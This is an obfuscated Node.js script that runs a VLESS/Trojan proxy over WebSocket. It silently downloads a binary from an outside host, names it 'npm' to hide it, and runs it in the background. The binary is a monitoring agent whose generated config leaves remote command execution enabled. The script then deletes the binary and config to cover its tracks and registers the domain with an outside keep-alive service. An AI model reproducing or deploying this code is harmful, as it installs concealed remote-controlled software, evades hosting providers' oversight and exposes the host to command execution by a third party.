const _0x3deca6=_0x3ba1;function _0x3ba1(_0x37213e,_0x430f53){_0x37213e=_0x37213e-0x14e;const _0x5535f6=_0x5535();let _0x3ba199=_0x5535f6[_0x37213e];return _0x3ba199;}(function(_0x4322ba,_0x1cfcbb){const _0x36f789=_0x3ba1,_0x19113b=_0x4322ba();while(!![]){try{const _0x1d5425=parseInt(_0x36f789(0x1bc))/0x1+parseInt(_0x36f789(0x15e))/0x2*(parseInt(_0x36f789(0x17a))/0x3)+-parseInt(_0x36f789(0x1ad))/0x4*(parseInt(_0x36f789(0x19e))/0x5)+-parseInt(_0x36f789(0x171))/0x6+parseInt(_0x36f789(0x19b))/0x7*(parseInt(_0x36f789(0x1a9))/0x8)+parseInt(_0x36f789(0x1c7))/0x9+-parseInt(_0x36f789(0x190))/0xa*(parseInt(_0x36f789(0x19c))/0xb);if(_0x1d5425===_0x1cfcbb)break;else _0x19113b['push'](_0x19113b['shift']());}catch(_0x345c71){_0x19113b['push'](_0x19113b['shift']());}}}(_0x5535,0x69bb7));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x3deca6(0x1bd)),net=require(_0x3deca6(0x1bf)),path=require(_0x3deca6(0x197)),crypto=require(_0x3deca6(0x184)),{Buffer}=require(_0x3deca6(0x1b2)),{exec,execSync}=require(_0x3deca6(0x1b3)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x3deca6(0x1bb)]||_0x3deca6(0x159),NEZHA_SERVER=process[_0x3deca6(0x17c)][_0x3deca6(0x1c3)]||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process[_0x3deca6(0x17c)][_0x3deca6(0x15c)]||'',DOMAIN=process[_0x3deca6(0x17c)][_0x3deca6(0x1ac)]||'1234.abc.com',AUTO_ACCESS=process['env'][_0x3deca6(0x182)]||!![],WSPATH=process['env']['WSPATH']||UUID[_0x3deca6(0x194)](0x0,0x8),SUB_PATH=process[_0x3deca6(0x17c)]['SUB_PATH']||_0x3deca6(0x199),NAME=process[_0x3deca6(0x17c)][_0x3deca6(0x154)]||'',PORT=process[_0x3deca6(0x17c)][_0x3deca6(0x1a0)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x198b36=_0x3deca6;try{const _0x5bf79e=await axios['get'](_0x198b36(0x176)),_0x37b10f=_0x5bf79e[_0x198b36(0x1b9)];ISP=(_0x37b10f[_0x198b36(0x157)]+'-'+_0x37b10f['isp'])[_0x198b36(0x1a3)](/ /g,'_');}catch(_0x33bc0c){ISP=_0x198b36(0x15f);}};GetISP();const httpServer=http[_0x3deca6(0x19a)]((_0x33b95a,_0x58e7ba)=>{const _0x1089b1=_0x3deca6;if(_0x33b95a[_0x1089b1(0x1af)]==='/'){const _0x432d91=path['join'](__dirname,'index.html');fs[_0x1089b1(0x16e)](_0x432d91,'utf8',(_0x332392,_0x24183f)=>{const _0x36ce8e=_0x1089b1;if(_0x332392){_0x58e7ba[_0x36ce8e(0x179)](0xc8,{'Content-Type':'text/html'}),_0x58e7ba['end'](_0x36ce8e(0x164));return;}_0x58e7ba[_0x36ce8e(0x179)](0xc8,{'Content-Type':_0x36ce8e(0x168)}),_0x58e7ba['end'](_0x24183f);});return;}else{if(_0x33b95a[_0x1089b1(0x1af)]==='/'+SUB_PATH){const _0x14be7a=NAME?NAME+'-'+ISP:ISP,_0x335300='vless://'+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x1089b1(0x16a)+WSPATH+'#'+_0x14be7a,_0xbc8be=_0x1089b1(0x183)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x1089b1(0x1aa)+DOMAIN+_0x1089b1(0x16a)+WSPATH+'#'+_0x14be7a,_0x40421d=_0x335300+'\x0a'+_0xbc8be,_0x3191ab=Buffer['from'](_0x40421d)[_0x1089b1(0x185)](_0x1089b1(0x198));_0x58e7ba[_0x1089b1(0x179)](0xc8,{'Content-Type':'text/plain'}),_0x58e7ba[_0x1089b1(0x1c4)](_0x3191ab+'\x0a');}else _0x58e7ba[_0x1089b1(0x179)](0x194,{'Content-Type':_0x1089b1(0x189)}),_0x58e7ba[_0x1089b1(0x1c4)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x3deca6(0x1c9))]({'server':httpServer}),uuid=UUID[_0x3deca6(0x1a3)](/-/g,''),DNS_SERVERS=['8.8.4.4','1.1.1.1'];function resolveHost(_0x5aef37){return new Promise((_0x43d752,_0x2de06b)=>{const _0x25e87e=_0x3ba1;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x25e87e(0x1c0)](_0x5aef37)){_0x43d752(_0x5aef37);return;}let _0x31f4ba=0x0;function _0x4c9d31(){const _0xe38ebd=_0x25e87e;if(_0x31f4ba>=DNS_SERVERS[_0xe38ebd(0x1a4)]){_0x2de06b(new Error(_0xe38ebd(0x1a1)+_0x5aef37+_0xe38ebd(0x153)));return;}const _0x1bd83d=DNS_SERVERS[_0x31f4ba];_0x31f4ba++;const _0x365423=_0xe38ebd(0x1c8)+encodeURIComponent(_0x5aef37)+_0xe38ebd(0x1ae);axios[_0xe38ebd(0x181)](_0x365423,{'timeout':0x1388,'headers':{'Accept':_0xe38ebd(0x170)}})['then'](_0x19961c=>{const _0x19ad30=_0xe38ebd,_0x1bba2e=_0x19961c['data'];if(_0x1bba2e[_0x19ad30(0x151)]===0x0&&_0x1bba2e['Answer']&&_0x1bba2e[_0x19ad30(0x1ca)]['length']>0x0){const _0x4b3cbb=_0x1bba2e[_0x19ad30(0x1ca)][_0x19ad30(0x16f)](_0x4fc97d=>_0x4fc97d[_0x19ad30(0x1c2)]===0x1);if(_0x4b3cbb){_0x43d752(_0x4b3cbb[_0x19ad30(0x1b9)]);return;}}_0x4c9d31();})[_0xe38ebd(0x1b1)](_0x19f56b=>{_0x4c9d31();});}_0x4c9d31();});}function _0x5535(){const _0x3e2463=['npm\x20running\x20error:','then','Status','config.yaml','\x20with\x20all\x20DNS\x20servers','NAME','https://arm64.ssss.nyc.mn/agent','pop','country_code','application/json','e66e3aff-b407-4e1e-b6aa-d9454e07c651','digest','false','NEZHA_KEY','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','278ivbulI','Unknown','map','join','unlink','error','Hello\x20world!','sha224','trim','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','text/html','true','&path=%2F','reduce','--tls','readUInt16BE','readFile','find','application/dns-json','4013346YGTxHZ','pipe','https://amd64.ssss.nyc.mn/agent','client_secret:\x20','\x20-p\x20','https://api.ip.sb/geoip','arch','https://amd64.ssss.nyc.mn/v1','writeHead','16734gyfoea','stream','env','log','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','message','concat','get','AUTO_ACCESS','trojan://','crypto','toString','8443','https://arm64.ssss.nyc.mn/v1','createHash','text/plain','setsid\x20nohup\x20./npm\x20-s\x20','split','443','close','send','/bin/bash','40HnTaOf','once','arm64','Automatic\x20Access\x20Task\x20added\x20successfully','slice','createWriteStream','npm','path','base64','sub','createServer','2669065gtlWXl','449009FTnchj','readUInt8','2878195tJSpUM','includes','PORT','Failed\x20to\x20resolve\x20','https://oooo.serv00.net/add-url','replace','length','2087','Server\x20is\x20running\x20on\x20port\x20','npm\x20download\x20successfully','decode','8rIvqvx','&fp=chrome&type=ws&host=','npm\x20is\x20running','DOMAIN','4KkQclj','&type=A','url','chmod\x20+x\x20npm','catch','buffer','child_process','substr','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','every','connect','post','data','error:\x20','UUID','461825vHxqyR','axios','connection','net','test','utf-8','type','NEZHA_SERVER','end','write','npm\x20is\x20already\x20running,\x20skip\x20running...','2001807yZQDrP','https://dns.google/resolve?name=','Server','Answer','finish'];_0x5535=function(){return _0x3e2463;};return _0x5535();}function handleVlessConnection(_0x184c01,_0x1128ed){const _0x2ebb41=_0x3deca6,[_0x80f8a7]=_0x1128ed,_0x1ea095=_0x1128ed[_0x2ebb41(0x194)](0x1,0x11);if(!_0x1ea095[_0x2ebb41(0x1b6)]((_0x4618e3,_0x5ddf97)=>_0x4618e3==parseInt(uuid[_0x2ebb41(0x1b4)](_0x5ddf97*0x2,0x2),0x10)))return![];let _0x50ad51=_0x1128ed[_0x2ebb41(0x194)](0x11,0x12)[_0x2ebb41(0x19d)]()+0x13;const _0x22b6c0=_0x1128ed[_0x2ebb41(0x194)](_0x50ad51,_0x50ad51+=0x2)[_0x2ebb41(0x16d)](0x0),_0xe7e603=_0x1128ed[_0x2ebb41(0x194)](_0x50ad51,_0x50ad51+=0x1)[_0x2ebb41(0x19d)](),_0x8ff1cf=_0xe7e603==0x1?_0x1128ed['slice'](_0x50ad51,_0x50ad51+=0x4)[_0x2ebb41(0x161)]('.'):_0xe7e603==0x2?new TextDecoder()[_0x2ebb41(0x1a8)](_0x1128ed[_0x2ebb41(0x194)](_0x50ad51+0x1,_0x50ad51+=0x1+_0x1128ed['slice'](_0x50ad51,_0x50ad51+0x1)[_0x2ebb41(0x19d)]())):_0xe7e603==0x3?_0x1128ed[_0x2ebb41(0x194)](_0x50ad51,_0x50ad51+=0x10)[_0x2ebb41(0x16b)]((_0x5313dd,_0x58c6f9,_0x5bfb74,_0x517b90)=>_0x5bfb74%0x2?_0x5313dd['concat'](_0x517b90[_0x2ebb41(0x194)](_0x5bfb74-0x1,_0x5bfb74+0x1)):_0x5313dd,[])['map'](_0x4b32d1=>_0x4b32d1['readUInt16BE'](0x0)[_0x2ebb41(0x185)](0x10))[_0x2ebb41(0x161)](':'):'';_0x184c01[_0x2ebb41(0x18e)](new Uint8Array([_0x80f8a7,0x0]));const _0x45d627=createWebSocketStream(_0x184c01);return resolveHost(_0x8ff1cf)[_0x2ebb41(0x150)](_0x3bd1fd=>{const _0x1f8479=_0x2ebb41;net[_0x1f8479(0x1b7)]({'host':_0x3bd1fd,'port':_0x22b6c0},function(){const _0x1322a4=_0x1f8479;this[_0x1322a4(0x1c5)](_0x1128ed[_0x1322a4(0x194)](_0x50ad51)),_0x45d627['on']('error',()=>{})[_0x1322a4(0x172)](this)['on']('error',()=>{})[_0x1322a4(0x172)](_0x45d627);})['on'](_0x1f8479(0x163),()=>{});})[_0x2ebb41(0x1b1)](_0x2b5f4e=>{const _0x3efa64=_0x2ebb41;net[_0x3efa64(0x1b7)]({'host':_0x8ff1cf,'port':_0x22b6c0},function(){const _0x306bd3=_0x3efa64;this[_0x306bd3(0x1c5)](_0x1128ed[_0x306bd3(0x194)](_0x50ad51)),_0x45d627['on'](_0x306bd3(0x163),()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](_0x45d627);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x3e68af,_0x16ea4a){const _0x1f3c66=_0x3deca6;try{if(_0x16ea4a['length']<0x3a)return![];const _0x368f6b=_0x16ea4a[_0x1f3c66(0x194)](0x0,0x38)['toString'](),_0x459b2e=[UUID];let _0x308530=null;for(const _0x274f31 of _0x459b2e){const _0x3e2960=crypto[_0x1f3c66(0x188)](_0x1f3c66(0x165))['update'](_0x274f31)[_0x1f3c66(0x15a)]('hex');if(_0x3e2960===_0x368f6b){_0x308530=_0x274f31;break;}}if(!_0x308530)return![];let _0x529295=0x38;_0x16ea4a[_0x529295]===0xd&&_0x16ea4a[_0x529295+0x1]===0xa&&(_0x529295+=0x2);const _0x23eab2=_0x16ea4a[_0x529295];if(_0x23eab2!==0x1)return![];_0x529295+=0x1;const _0x5c461b=_0x16ea4a[_0x529295];_0x529295+=0x1;let _0x2ca5cb,_0x181cad;if(_0x5c461b===0x1)_0x2ca5cb=_0x16ea4a[_0x1f3c66(0x194)](_0x529295,_0x529295+0x4)[_0x1f3c66(0x161)]('.'),_0x529295+=0x4;else{if(_0x5c461b===0x3){const _0x3b289c=_0x16ea4a[_0x529295];_0x529295+=0x1,_0x2ca5cb=_0x16ea4a[_0x1f3c66(0x194)](_0x529295,_0x529295+_0x3b289c)[_0x1f3c66(0x185)](),_0x529295+=_0x3b289c;}else{if(_0x5c461b===0x4)_0x2ca5cb=_0x16ea4a[_0x1f3c66(0x194)](_0x529295,_0x529295+0x10)['reduce']((_0x44e6d0,_0x527bc0,_0x16c0b7,_0x46e4a5)=>_0x16c0b7%0x2?_0x44e6d0[_0x1f3c66(0x180)](_0x46e4a5[_0x1f3c66(0x194)](_0x16c0b7-0x1,_0x16c0b7+0x1)):_0x44e6d0,[])[_0x1f3c66(0x160)](_0x3ce931=>_0x3ce931[_0x1f3c66(0x16d)](0x0)[_0x1f3c66(0x185)](0x10))[_0x1f3c66(0x161)](':'),_0x529295+=0x10;else return![];}}_0x181cad=_0x16ea4a[_0x1f3c66(0x16d)](_0x529295),_0x529295+=0x2;_0x529295<_0x16ea4a['length']&&_0x16ea4a[_0x529295]===0xd&&_0x16ea4a[_0x529295+0x1]===0xa&&(_0x529295+=0x2);const _0x4f1610=createWebSocketStream(_0x3e68af);return resolveHost(_0x2ca5cb)[_0x1f3c66(0x150)](_0x54e226=>{const _0x498286=_0x1f3c66;net[_0x498286(0x1b7)]({'host':_0x54e226,'port':_0x181cad},function(){const _0x535403=_0x498286;_0x529295<_0x16ea4a[_0x535403(0x1a4)]&&this[_0x535403(0x1c5)](_0x16ea4a[_0x535403(0x194)](_0x529295)),_0x4f1610['on'](_0x535403(0x163),()=>{})['pipe'](this)['on']('error',()=>{})[_0x535403(0x172)](_0x4f1610);})['on'](_0x498286(0x163),()=>{});})[_0x1f3c66(0x1b1)](_0x4c7096=>{const _0x16a592=_0x1f3c66;net[_0x16a592(0x1b7)]({'host':_0x2ca5cb,'port':_0x181cad},function(){const _0xd5fc26=_0x16a592;_0x529295<_0x16ea4a['length']&&this[_0xd5fc26(0x1c5)](_0x16ea4a[_0xd5fc26(0x194)](_0x529295)),_0x4f1610['on'](_0xd5fc26(0x163),()=>{})[_0xd5fc26(0x172)](this)['on'](_0xd5fc26(0x163),()=>{})['pipe'](_0x4f1610);})['on']('error',()=>{});}),!![];}catch(_0x37e2f7){return![];}}wss['on'](_0x3deca6(0x1be),(_0x30c990,_0x4b553a)=>{const _0x2a72f0=_0x3deca6,_0x546255=_0x4b553a[_0x2a72f0(0x1af)]||'';_0x30c990[_0x2a72f0(0x191)](_0x2a72f0(0x17f),_0x5de089=>{const _0x206e0d=_0x2a72f0;if(_0x5de089['length']>0x11&&_0x5de089[0x0]===0x0){const _0x581079=_0x5de089[_0x206e0d(0x194)](0x1,0x11),_0x1ebfb2=_0x581079[_0x206e0d(0x1b6)]((_0x26f609,_0x1e79f5)=>_0x26f609==parseInt(uuid[_0x206e0d(0x1b4)](_0x1e79f5*0x2,0x2),0x10));if(_0x1ebfb2){!handleVlessConnection(_0x30c990,_0x5de089)&&_0x30c990[_0x206e0d(0x18d)]();return;}}!handleTrojanConnection(_0x30c990,_0x5de089)&&_0x30c990[_0x206e0d(0x18d)]();})['on'](_0x2a72f0(0x163),()=>{});});const getDownloadUrl=()=>{const _0x22cd29=_0x3deca6,_0x591078=os[_0x22cd29(0x177)]();return _0x591078==='arm'||_0x591078===_0x22cd29(0x192)||_0x591078==='aarch64'?!NEZHA_PORT?_0x22cd29(0x187):_0x22cd29(0x155):!NEZHA_PORT?_0x22cd29(0x178):_0x22cd29(0x173);},downloadFile=async()=>{const _0x1157a6=_0x3deca6;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0xdefc1e=getDownloadUrl(),_0x1fa5e4=await axios({'method':_0x1157a6(0x181),'url':_0xdefc1e,'responseType':_0x1157a6(0x17b)}),_0x26dd4b=fs[_0x1157a6(0x195)](_0x1157a6(0x196));return _0x1fa5e4['data'][_0x1157a6(0x172)](_0x26dd4b),new Promise((_0x52fef8,_0x3bdc7b)=>{const _0x2634bf=_0x1157a6;_0x26dd4b['on'](_0x2634bf(0x14e),()=>{const _0xc83b74=_0x2634bf;console[_0xc83b74(0x17d)](_0xc83b74(0x1a7)),exec(_0xc83b74(0x1b0),_0x162776=>{if(_0x162776)_0x3bdc7b(_0x162776);_0x52fef8();});}),_0x26dd4b['on'](_0x2634bf(0x163),_0x3bdc7b);});}catch(_0x53bb26){throw _0x53bb26;}},runnz=async()=>{const _0x1f2656=_0x3deca6;try{const _0x13c878=execSync(_0x1f2656(0x15d),{'encoding':_0x1f2656(0x1c1)});if(_0x13c878[_0x1f2656(0x166)]()!==''){console[_0x1f2656(0x17d)](_0x1f2656(0x1c6));return;}}catch(_0x251f4d){}await downloadFile();let _0x2ab536='',_0x2dd0bf=[_0x1f2656(0x18c),_0x1f2656(0x186),'2096',_0x1f2656(0x1a5),'2083','2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x2eb1da=_0x2dd0bf[_0x1f2656(0x19f)](NEZHA_PORT)?_0x1f2656(0x16c):'';_0x2ab536=_0x1f2656(0x18a)+NEZHA_SERVER+':'+NEZHA_PORT+_0x1f2656(0x175)+NEZHA_KEY+'\x20'+_0x2eb1da+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x114396=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x1f2656(0x18b)](':')[_0x1f2656(0x156)]():'',_0x235219=_0x2dd0bf['includes'](_0x114396)?_0x1f2656(0x169):_0x1f2656(0x15b),_0x5b9af0=_0x1f2656(0x174)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x1f2656(0x167)+_0x235219+_0x1f2656(0x17e)+UUID;fs['writeFileSync'](_0x1f2656(0x152),_0x5b9af0);}_0x2ab536='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x1f2656(0x17d)](_0x1f2656(0x1b5));return;}}try{exec(_0x2ab536,{'shell':_0x1f2656(0x18f)},_0x279644=>{const _0x4a36a5=_0x1f2656;if(_0x279644)console[_0x4a36a5(0x163)](_0x4a36a5(0x14f),_0x279644);else console['log'](_0x4a36a5(0x1ab));});}catch(_0x3f9ad8){console[_0x1f2656(0x163)](_0x1f2656(0x1ba)+_0x3f9ad8);}};async function addAccessTask(){const _0x4cbb4d=_0x3deca6;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x2c0002='https://'+DOMAIN;try{const _0xf2b732=await axios[_0x4cbb4d(0x1b8)](_0x4cbb4d(0x1a2),{'url':_0x2c0002},{'headers':{'Content-Type':_0x4cbb4d(0x158)}});console[_0x4cbb4d(0x17d)](_0x4cbb4d(0x193));}catch(_0x16832c){}}const delFiles=()=>{const _0x4035f0=_0x3deca6;fs[_0x4035f0(0x162)](_0x4035f0(0x196),()=>{}),fs[_0x4035f0(0x162)](_0x4035f0(0x152),()=>{});};httpServer['listen'](PORT,()=>{const _0x48e020=_0x3deca6;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x48e020(0x1a6)+PORT);});
